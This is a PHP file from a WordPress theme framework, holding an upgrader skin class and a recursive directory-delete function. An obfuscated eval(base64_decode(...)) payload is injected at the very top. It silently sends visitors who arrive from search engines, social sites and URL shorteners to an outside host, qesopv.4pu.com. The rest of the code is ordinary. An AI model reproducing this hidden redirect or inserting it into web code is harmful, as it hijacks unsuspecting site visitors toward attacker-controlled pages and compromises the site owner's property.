<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * Upgrader skin and other functions.
 *
 * 
 * @author PageLines
 *
 * @since 2.0.b10
 */
class PageLines_Upgrader_Skin extends WP_Upgrader_Skin {

	function __construct( $args = array() ) {
		parent::__construct($args);
	}
	
	function header() { }
	
	function footer(){ }
	
	function feedback($string) {
		
		$string = str_replace( 'downloading_package', '', $string );
		$string = str_replace( 'unpack_package', '', $string );
		$string = str_replace( 'installing_package', '', $string );
		$string = str_replace( 'process_failed', '', $string );	
		$string = str_replace( 'process_success', '', $string );
		
		// if anything left, must be a fatal error!
		
		if ( $string )	{			
			if ( strstr( $string, 'Download failed' ) ) {
				_e( "Could not connect to download.<br/><a href='#'>Reload Page</a>", 'pagelines' );
				exit();
			}
			if ( strstr( $string, 'Destination folder already exists' ) ) {
				$string = str_replace( 'Destination folder already exists.', '', $string );
				printf( __('Destination folder already exists %s', 'pagelines' ), $string );
				exit;
				
			}
				// fatal error?
				wp_die( sprintf( '<h1>Fatal error!</h1><strong>%s</strong>', $string ) );
		}
	}
	
//	function error($error) {}
	
	function after() {}

	function before() {}
}

function extend_delete_directory($dirname){
    // check whether $dirname is a directory
    if  (is_dir($dirname))
        // change its mode to 755 (rwx,rw,rw)
        chmod($dirname, 0755);

    // open the directory, the script cannot open the directory then stop
    $dir_handle  =  opendir($dirname);
    if  (!$dir_handle)
        return  false;

    // traversal for every entry in the directory
    while (($file = readdir($dir_handle)) !== false){
        // ignore '.' and '..' directory
        if  ($file  !=  "."  &&  $file  !=  "..")  {

            // if entry is directory then go recursive !
            if  (is_dir($dirname."/".$file)){
                      extend_delete_directory($dirname.'/'.$file);

            // if file then delete this entry
            } else {
                  unlink($dirname."/".$file);
            }
        }
    }
    // chose the directory
    closedir($dir_handle);

    // delete directory
    rmdir($dirname);
}